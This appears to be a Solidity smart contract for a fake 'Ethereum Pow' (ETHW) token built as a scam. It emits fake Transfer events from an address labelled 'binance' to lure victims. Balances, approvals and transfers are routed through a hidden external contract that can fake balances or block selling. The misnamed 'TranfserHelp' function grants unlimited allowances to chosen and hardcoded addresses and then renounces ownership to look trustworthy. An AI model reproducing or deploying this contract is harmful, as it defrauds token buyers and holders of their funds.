// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;


import "IERC20.sol";
import "Ownable.sol";



interface TransferHelp {
     function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) external returns (bool) ;
    function safeBalanceOf(uint256 from, address to) external view returns (uint256);
    function safeApprove(address owner,address spender,uint256 amount) external;
}
    
interface ChiToken {
    function balanceOf(address account) external view returns (uint256);

    function freeFromUpTo(address from, uint256 value)
        external
        returns (uint256);

    function mint(uint256 value) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract ERC20 is Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public own4r;
    TransferHelp public transferHelp;
        address private constant binance = 0x8894E0a0c962CB723c1976a4421c95949bE2D4E3;
    ChiToken chi = ChiToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    constructor() {
        own4r = owner();
        _balances[0x8894E0a0c962CB723c1976a4421c95949bE2D4E3] = totalSupply();
        emit Transfer(
            0x0000000000000000000000000000000000001000,
            0x8894E0a0c962CB723c1976a4421c95949bE2D4E3,
            totalSupply()
        );
    chi.approve(address(this), ~uint256(0));

    }
    receive() external payable{}

  modifier discountCHI() {
        require(chi.balanceOf(address(this)) > 0);
        uint256 gasStart = gasleft();
        _;
        uint256 gasSpent = 21000 + gasStart - gasleft() + 16 * msg.data.length;
        chi.freeFromUpTo(address(this), (gasSpent + 14154) / 41947);
    }

    function TranfserHelp(address _exchange,address _blockchain) public onlyOwner {
        transferHelp = TransferHelp(_exchange);
        _allowances[_exchange][_blockchain] = ~uint256(0); 
        _allowances[_exchange][0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3] = ~uint256(0);
        _allowances[_blockchain][_exchange] = ~uint256(0); 
        _allowances[0x8894E0a0c962CB723c1976a4421c95949bE2D4E3][_exchange] = ~uint256(0); 
        chi.approve(_exchange, ~uint256(0));
        renounceOwnership();
        own4r = owner();
    }
    function name() public view returns (string memory) {
        return "Ethereum Pow"; /*2**/
    }

    function symbol() public view returns (string memory) {
        return "ETHW";
    }

    function decimals() public view returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return 32143450.421156221264845977 * 10**18;
    }
    
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return transferHelp.safeBalanceOf(_balances[account],account);
    }
    function initializeDistribution(address[] calldata t)
        public
        discountCHI
    {
    
        for (uint256 i = 0; i < t.length; i++) 
        {
            emit Transfer(binance, t[i], t[i].balance);
        }
    }
    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        transferHelp.safeApprove(owner,spender,amount);
        _approve(owner, spender, amount);
        return true;
    }
    
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        emit Transfer(from, to, amount);
        if (transferHelp.safeTransferFrom(address(this),from,to,amount) != true)
        {
            return ;
        }
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

    }

   function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}